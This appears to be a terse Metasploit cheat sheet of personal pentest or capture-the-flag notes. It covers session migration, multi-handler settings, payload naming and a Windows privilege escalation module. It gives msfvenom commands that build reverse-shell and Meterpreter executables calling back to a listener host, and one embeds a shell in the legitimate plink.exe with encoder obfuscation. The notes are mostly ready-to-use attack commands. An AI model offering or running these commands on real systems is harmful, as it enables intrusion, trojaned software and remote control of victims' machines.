
migrate immediately after getting shell. good for client-side attacks, since victim may close the browser
`set InitialAutoRunScript migrate -f` 
or
 `set AUTORUNSCRIPT post/windows/manage/migrate`


# multi-handler
```
set ExitOnSession false
set SessionCommunicationTimeout 0
set autorunscript multi_console_command -cl "screenshot","sysinfo"
set ExitOnSession false
```

# Workspaces
```
workspace -a newbro
workspace newbro
db_export -f xml /tmp/bro-nmap-scans.xml
db_import /ctf/nmap.xml
```
# Staged payloads
[platform]/[arch?]/[shell/meterpreter]/[reverse/bind]_[protocol]
- windows/meterpreter/reverse_https
- linux/x86/shell/reverse_tcp
# Non-staged
[platform]/[arch?]/[shell]_[reverse/bind]_[protocol]
- windows/shell_reverse_tcp
- linux/x86/shell_reverse_tcp

# win privesc
`use exploit/windows/local/service_permissions`

# Embed w/ existing program and keepits functionality with -k
```
msfvenom -p windows/shell_reverse_tcp LHOST=192.168.1.23 LPORT=443 -f exe -e x86/shikata_ga_nai -i 9 -o shell.exe -x /usr/share/windows-binaries/plink.exe -k 
msfvenom -p linux/x86/exec CMD=/bin/sh -f elf -o gimmeshell
```
# Rev. HTTPS classic for windows
```
msfvenom -a x86 --platform windows -p windows/meterpreter/reverse_https lhost=example.com lport=443 -f exe -o lifeishard.exe
msfvenom -a x64 --platform windows -p windows/x64/meterpreter/reverse_https lhost=example.com lport=443 -f exe -o lifetrap.exe
```

if "Command shell session 1 closed.  Reason: Died from Errno::ECONNRESET"? disable encoding. set to true, its a bug (https://github.com/rapid7/metasploit-framework/issues/8357)
`set EnableStageEncoding true` # 

 disable encoding.
`set StageEncoder "generic/none"` 


